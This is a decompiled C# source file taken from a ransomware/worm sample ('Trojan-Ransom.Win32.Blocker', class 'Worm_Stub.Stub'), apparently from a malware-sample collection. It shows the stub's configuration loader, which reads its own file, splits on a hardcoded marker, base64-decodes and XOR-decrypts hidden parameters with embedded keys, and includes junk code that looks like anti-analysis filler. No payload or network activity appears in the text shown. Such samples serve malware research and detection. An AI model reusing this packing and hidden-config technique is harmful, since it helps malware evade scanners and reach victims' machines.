// Decompiled with JetBrains decompiler
// Type: Worm_Stub.Stub
// Assembly: Worm Stub, Version=2.0.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 5B3CDB14-EBC4-49A1-A390-B2635BB34BD7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.hekx-ec754abadcf18e0478a7d2c9c5ecfd09812f77ec6bc75bc8ca599ac17658ef11.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace Worm_Stub
{
  public class Stub
  {
    private const string MasterDecryptionKey = "kjkrentejkr4o457396njkfdh32485734nksdmuenfreu435974fjhbfdj";
    private const string MasterSplitKey = "djwefneuh435243kjnfjkweuhgre453245kjnvjkfnejrkf";

    [DebuggerNonUserCode]
    public Stub()
    {
    }

    public string[] GetParameters(string StubLocation)
    {
      string empty1 = string.Empty;
      string empty2 = string.Empty;
      List<string> stringList = new List<string>();
      string[] parameters;
      try
      {
        string[] strArray1 = Strings.Split(this.DecryptXOR(Strings.Split(Encoding.Unicode.GetString(Convert.FromBase64String(Strings.Split(File.ReadAllText(StubLocation), "djwefneuh435243kjnfjkweuhgre453245kjnvjkfnejrkf")[1])), "djwefneuh435243kjnfjkweuhgre453245kjnvjkfnejrkf")[1], "kjkrentejkr4o457396njkfdh32485734nksdmuenfreu435974fjhbfdj"), "djwefneuh435243kjnfjkweuhgre453245kjnvjkfnejrkf");
        string[] strArray2 = Strings.Split(this.DecryptXOR(strArray1[0], strArray1[1]), "djwefneuh435243kjnfjkweuhgre453245kjnvjkfnejrkf");
        int index = 0;
        while (index < strArray2.Length)
        {
          string Left = strArray2[index];
          if (Operators.CompareString(Left, string.Empty, false) != 0)
            stringList.Add(Left);
          checked { ++index; }
        }
        parameters = stringList.ToArray();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        parameters = (string[]) null;
        ProjectData.ClearProjectError();
      }
      return parameters;
    }

    private string DecryptXOR(string StringToDecrypt1, string DecryptionKey)
    {
      string str1 = Conversions.ToString(1);
      string str2 = Conversions.ToString(2);
      if (Operators.CompareString(str1, str2, false) > 0)
      {
        int num1 = (int) MessageBox.Show("error", "error");
      }
      if (Operators.CompareString(str2, str1, false) <= 0)
        ;
      string str3;
      try
      {
        string empty = string.Empty;
        long num2 = checked ((long) Math.Round(unchecked ((double) Strings.Len(StringToDecrypt1) / 2.0)));
        long num3 = 1;
        while (num3 <= num2)
        {
          int num4 = checked ((int) Math.Round(Conversion.Val("&H" + Strings.Mid(StringToDecrypt1, (int) (2L * num3 - 1L), 2))));
          int num5 = Strings.Asc(Strings.Mid(DecryptionKey, checked ((int) (unchecked (num3 % (long) Strings.Len(DecryptionKey)) + 1L)), 1));
          empty += Conversions.ToString(Strings.Chr(num4 ^ num5));
          checked { ++num3; }
        }
        str3 = empty;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str3 = string.Empty;
        ProjectData.ClearProjectError();
      }
      return str3;
    }
  }
}
